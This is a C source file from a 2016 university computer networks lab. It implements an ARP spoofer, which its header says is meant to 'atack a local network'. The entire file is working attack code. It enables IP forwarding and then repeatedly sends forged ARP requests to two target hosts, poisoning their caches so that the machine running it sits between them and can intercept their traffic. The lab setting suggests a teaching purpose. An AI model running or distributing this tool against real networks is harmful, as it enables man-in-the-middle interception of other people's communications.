// -----------------------------------------------------------
// Developed By Marcos Luiggi Sartori
//              Leonardo Pavanatto Soares
// Pontifical Catholic University of Rio Grande do Sul (PUCRS)
// Computer Networks Laboratory - April 11, 2016
// -----------------------------------------------------------
// File: arp_spoofer.c
// Description: atack a local network.
// -----------------------------------------------------------
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>

#include "arp.h"
#include "mac.h"

static volatile unsigned keepRunning = 1;

static void intHandler() {
  keepRunning = 0;
}

int main(int argc, char *argv[]) {
  raw_iface_t iface;
  int fd;
  ipaddr_t ipaddr_a, ipaddr_b;
  macaddr_t macaddr_a, macaddr_b;
  FILE *ip_forward;

  if (argc < 4) {
    fprintf(stderr, "Usage: %s <iface> <target A ip> <target B ip>\n", argv[0]);
    return 1;
  }
  
  if(parse_ipv4str(ipaddr_a, argv[2])) {
    fprintf(stderr, "Invalid ip addr %s\n", argv[2]);
    exit(1);
  }

  if(parse_ipv4str(ipaddr_b, argv[3])) {
    fprintf(stderr, "Invalid ip addr %s\n", argv[3]);
    exit(1);
  }

  if((fd = open_raw_socket(&iface, argv[1], ETH_P_ARP)) < 0)
    exit(1);

  // Enables ip_forward
  if(!((ip_forward = fopen("/proc/sys/net/ipv4/ip_forward", "w")) &&
       (fputc('1', ip_forward) == '1')))
    fprintf(stderr, "WARNING: Unable to set ip_forward\n");
  
  if(ip_forward)
    fclose(ip_forward);

  // lookup macaddr for ipaddr_a pretending to be ipaddr_b
  if(arp4_lookup(&iface, ipaddr_b, iface.macaddr, ipaddr_a, macaddr_a) < 0) {
    fprintf(stderr, "ARP Lookup failed for %s\n", argv[2]);
    close(fd);
    exit(1);
  }

  // lookup macaddr for ipaddr_b pretending to be ipaddr_a
  if(arp4_lookup(&iface, ipaddr_a, iface.macaddr, ipaddr_b, macaddr_b) < 0) {
    fprintf(stderr, "ARP Lookup failed for %s\n", argv[3]);
    close(fd);
    exit(1);
  }

  printf("All set!\n");

  /* until SIGINT is received keep sending fake requests
   * directly to attacked hosts every second */
  signal(SIGINT, intHandler);
  while(keepRunning) {
    send_arp4_request(&iface, iface.macaddr, ipaddr_b, macaddr_a, ipaddr_a);
    send_arp4_request(&iface, iface.macaddr, ipaddr_a, macaddr_b, ipaddr_b);
    sleep(1);
  }

  printf("Good bye!\n");
  close(fd);
  return 0;
}
